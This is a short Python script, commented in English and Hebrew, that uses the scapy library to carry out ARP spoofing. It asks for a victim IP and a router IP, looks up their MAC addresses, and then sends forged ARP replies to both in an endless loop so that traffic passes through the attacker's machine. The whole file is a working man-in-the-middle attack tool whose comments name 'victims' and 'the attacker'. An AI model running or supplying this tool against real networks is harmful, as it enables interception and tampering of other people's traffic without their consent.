# imports
import time
import sys 
import scapy.all as scapy


def get_mac(ip):
  # creating an ARP request to the ip address בודק של מי הכתובת שהוקצאה
    arp_request = scapy.ARP(pdst=ip)
  # setting the default denstination MAC address to broadcast MAC שליחת הודעה כוללת עם כתובת מאק ברירת מחדל
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  # combining the ARP packet with the broadcast message איחוד שתי הכתובות שהתקבלו לבקשת ארפ
    arp_request_broadcast = broadcast / arp_request
  # return a list of MAC addresses with respective MAC addresses and IP addresses. החזרת רשימה עם כתובות אייפי ומאק בהתאמה
    answ = scapy.srp(arp_request_broadcast, timeout=12, verbose=False)[0]
  # we choose the first MAC address and select the MAC address using the field hwsrc בחירת כתובת המאק הרצויה לשינוי
    return answ[0][1].hwsrc

# Creating an ARP packet that will be sent to the victimes and will change the MAC address of the victimes to that of the attacker. שליחת הפקטה עם הפרטים של התוקף ככתובת המאק ביחד עם כתובת האיייפי של הנתקף
def arp_spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#Receive input of the IP of the attacked position and of the attacked router.
victim_ip = input("victim ip: ")
router_ip = input("router ip: ")

# initializing the packet counter
sent_packets_count = 0

while True:
    sent_packets_count += 2
    arp_spoof(victim_ip, router_ip)
    arp_spoof(router_ip, victim_ip)
    print("[+] Packets sent" + str(sent_packets_count))
    sys.stdout.flush()
    time.sleep(2)
